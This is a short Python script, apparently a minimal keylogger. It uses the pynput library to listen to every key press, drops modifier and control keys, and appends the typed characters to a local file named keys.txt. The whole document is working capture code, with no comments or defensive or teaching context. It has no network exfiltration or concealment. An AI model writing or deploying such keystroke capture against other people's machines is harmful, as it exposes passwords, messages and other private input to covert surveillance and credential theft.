from pynput.keyboard import Listener


def wf(key):
    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == 'Key.shift':
        letter = ''
    if letter == 'Key.backspace':
        letter = ''
    if letter == 'Key.enter':
        letter = ''
    if letter == 'Key.cmd':
        letter = ''
    if letter == 'Key.caps_lock':
        letter = ''
    if letter == 'Key.tab':
        letter = ''
    if letter == 'Key.alt_gr':
        letter = ''
    if letter == 'Key.alt_l':
        letter = ''
    if letter == 'Key.ctrl_l':
        letter = ''
    if letter == 'Key.ctrl_r':
        letter = ''
    if letter == 'Key.menu':
        letter = ''
    if letter == 'Key.esc':
        letter = ''
    with open("keys.txt", 'a') as f:
        f.write(letter)


with Listener(on_press=wf) as j:
    j.join()
